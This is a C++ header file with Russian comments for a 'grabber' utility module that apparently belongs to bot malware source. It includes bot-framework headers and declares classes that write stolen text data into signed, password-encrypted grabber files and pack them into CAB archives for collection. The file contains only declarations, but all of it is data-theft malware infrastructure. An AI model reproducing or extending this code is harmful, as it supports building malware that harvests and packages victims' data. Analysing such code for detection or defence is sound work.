//---------------------------------------------------------------------------
//  Модуль утилит для работы граберов
//---------------------------------------------------------------------------

#ifndef GrabbersH
#define GrabbersH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"


// сигнатура файла грабера
#define GRABBER_FILE_SIGNATURE 0x87AF1966

// сигнатура блока данных файла грабера
#define GRABBER_FILE_BLOCK_SIGNATURE 0xC7BFB244

// Версия файла грабера
#define GRABBER_FILE_VERSION MAKELONG(1, 0)


// ьтпы данных граберов
#define GRABBER_DATA_TEXT 1  /* Текстовый блок */


//-------------------------------------------
//  GetGrabbersPath - Функция возвращет имя
//                рабочего каталога грабера
//-------------------------------------------
string GetGrabbersPath();



class TGrabberFile;
class TGrabberBlock;



//------------------------------------------------------
//  TGrabberFile - Базовый класс для работы с файлом
//                 грабера
//------------------------------------------------------
class TGrabberFile : public TBotObject
{
private:
	TBotCollection* FBlocks; // Коллекция блоков
	string FFileName;     // Имя файла
	string FGrabberName;  // Имя грабера
	PCHAR  FPassword;     // Пароль шифрования
	DWORD  FType;         // Тип файла
	DWORD  FBlocksStart;  // Смещение в файле к началу блоков данных
	TBotFileStream *FStream;

	bool   UpdateFileHeader(bool WriteName);
	bool   ReadBlocks();
    string DoPackTextData();


	friend class TGrabberBlock;
protected:
	bool WriteData(LPVOID Data, DWORD Size, bool WriteSize);
	bool WriteSizedString(const string &Str);

	bool ReadData(LPVOID Buf, DWORD DataSize);
	bool ReadString(DWORD StringSize, string &Str);
	bool ReadSizedString(string &Str);
public:
	TGrabberFile(const string& GrabberName);
	~TGrabberFile();
    bool Active();  // Функция возвращет истину если в данный момент фал открыт
	bool Create();  // Функция создаёт файл грабера
	bool Open();    // Функция открывает ранее созданный файл

	void CloseFile(); // Функция закрывает открытый файл

    string PackToCAB(); // Функция запаковывает данные в каб архив

    bool Test();

	bool AddText(const string& Name, const string& Data); // Функция добавляет текстовые данные
};


//------------------------------------------------------
//  TGrabberBlock - Блок данных грабера
//------------------------------------------------------
class TGrabberBlock : public TBotCollectionItem
{
private:
	TGrabberFile* FFile;
	string FName;
	string FFileName;
	string FInternalFileName;
	DWORD  FDataSize;    // Размер данных блока
	string FAsString;    // Строковые данные
	LPBYTE FAsBlob;      // Данные в бинарном виде
	DWORD  FDataType;    // Тип данных блока
	bool   FIgnoreBlock; // Данный блок необходимо проигнорировать

	void Initialize();

	bool Write(LPVOID Data, DWORD DataSize);

	bool Read();
	bool ReadBlockData();


	friend class TGrabberFile;
public:

	TGrabberBlock(TGrabberFile* File);
	~TGrabberBlock();

	void Clear();

	bool WriteText(const string& Name, const string& Data);
};

//---------------------------------------------------------------------------
#endif
